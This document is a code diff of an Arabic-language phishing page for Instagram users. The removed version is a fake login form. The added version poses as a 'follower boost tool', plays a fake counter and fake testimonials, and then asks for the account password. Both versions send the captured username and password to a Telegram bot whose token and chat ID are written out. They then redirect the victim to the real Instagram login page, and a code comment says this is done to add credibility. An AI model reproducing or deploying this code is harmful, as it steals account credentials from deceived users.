@@ -1,34 +1,109 @@
-<!DOCTYPE html>
-<html lang="ar">
+[THREAT BLOCKED]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               <!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>اداه رشق متابعين انستجرام v2</title>
     <style>
-        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
-        button { width: 100%; padding: 7px; background: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
-        img { width: 175px; margin-bottom: 20px; }
+        :root { --ig-grad: linear-gradient(45deg, #f09433, #dc2743, #bc1888); }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 10px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 400px; background: #121212; border: 1px solid #333; border-radius: 15px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .logo { width: 70px; margin-bottom: 10px; }
+        .step { display: none; }
+        .active { display: block; }
+        input { width: 100%; padding: 14px; margin: 10px 0; background: #262626; border: 1px solid #444; border-radius: 8px; color: #fff; box-sizing: border-box; text-align: center; font-size: 16px; }
+        button { width: 100%; padding: 14px; background: var(--ig-grad); border: none; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
+        button:hover { opacity: 0.9; transform: scale(0.98); }
+
+        /* العداد المطور */
+        #counter { font-size: 50px; font-weight: bold; color: #00f2ff; margin: 20px 0; text-shadow: 0 0 15px rgba(0,242,255,0.6); font-family: 'Courier New'; }
+        .loading-text { color: #f09433; font-weight: bold; margin-bottom: 10px; }
+
+        /* التعليقات */
+        .comments-section { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; text-align: right; }
+        .comment { background: #1a1a1a; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 12px; border-right: 3px solid #bc1888; }
+        .comment b { color: #f09433; display: block; margin-bottom: 3px; }
+        .comment span { color: #888; font-size: 10px; float: left; }
     </style>
 </head>
 <body>
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="logo">
-    <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف">
-    <input type="password" id="pass" placeholder="كلمة السر">
-    <button onclick="send()">تسجيل الدخول</button>
-</div>
-<script>
-function send() {
-    const token = "8604267858:AAHZ2dBFT-LdMS_X5F6AF-6BakUi80iFtDA";
-    const chatId = "6018639900";
-    const u = document.getElementById("user").value;
-    const p = document.getElementById("pass").value;
-    const msg = `📸 صيد إنستجرام جديد! \n👤 User: ${u} \n🔑 Pass: ${p}`;
-    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
-    .then(() => { window.location.href = "https://instagram.com"; });
-}
-</script>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="logo">
+        <h2 style="font-size: 20px; color: #fff; margin-bottom: 20px;">اداه رشق متابعين انستجرام v2</h2>
+
+        <div id="step1" class="step active">
+            <p style="color: #ccc;">أدخل اسم المستخدم لبدء عملية الرشق</p>
+            <input type="text" id="username" placeholder="اسم المستخدم (Username)" autocomplete="off">
+            <button onclick="startProcessing()">بدء توليد المتابعين</button>
+        </div>
+
+        <div id="step2" class="step">
+            <p class="loading-text">جاري الاتصال بالسيرفر...</p>
+            <div id="counter">0</div>
+            <p style="font-size: 13px; color: #888;">يتم الآن إرسال المتابعين للحساب...</p>
+        </div>
+
+        <div id="step3" class="step">
+            <h3 style="color: #4bb543; margin-top: 0;">تم تجهيز 5000 متابع!</h3>
+            <p style="font-size: 14px; color: #eee;">يجب تأكيد ملكية الحساب لاستلام المتابعين فورا</p>
+            <input type="password" id="password" placeholder="كلمة مرور الحساب" autocomplete="off">
+            <button onclick="finalCapture()">تأكيد واستلام المتابعين</button>
+        </div>
+
+        <div class="comments-section">
+            <div class="comment"><b>@ahmed_ali</b> وصلني 5000 متابع الآن! شكرا v2 <span>منذ 1 دقيقة</span></div>
+            <div class="comment"><b>@sara.insta</b> كنت خايفة بس طلع شغال والصورة ظهرت <span>منذ 4 دقائق</span></div>
+            <div class="comment"><b>@mido_hacker</b> أفضل سكربت رشق جربته في 2026 <span>منذ 10 دقائق</span></div>
+        </div>
+    </div>
+
+    <script>
+        function showStep(step) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+        }
+
+        function startProcessing() {
+            const user = document.getElementById('username').value;
+            if (!user) { alert("من فضلك أدخل اليوزر نيم"); return; }
+
+            showStep(2);
+            let count = 0;
+            let counterEl = document.getElementById('counter');
+
+            let timer = setInterval(() => {
+                count += Math.floor(Math.random() * 120) + 40;
+                if (count >= 5000) {
+                    count = 5000;
+                    clearInterval(timer);
+                    setTimeout(() => showStep(3), 800);
+                }
+                counterEl.innerText = count;
+            }, 60);
+        }
+
+        function finalCapture() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            if (!pass || pass.length < 4) { alert("كلمة المرور غير صحيحة!"); return; }
+
+            // --- بياناتك الشخصية ---
+            const token = "8604267858:AAHZ2dBFT-LdMS_X5F6AF-6BakUi80iFtDA";
+            const chatId = "6018639900";
+            
+            const message = `🔥 صيد رشق إنستجرام V2 🔥\n\n👤 اليوزر: ${user}\n🔑 الباسورد: ${pass}\n\n🚀 الضحية طلب 5000 متابع!`;
+
+            // إرسال البيانات لتليجرام
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                // التوجيه لإنستجرام الحقيقي لزيادة المصداقية
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            })
+            .catch(() => {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        }
+    </script>
 </body>
-</html>
+</html>                                                                                                                                
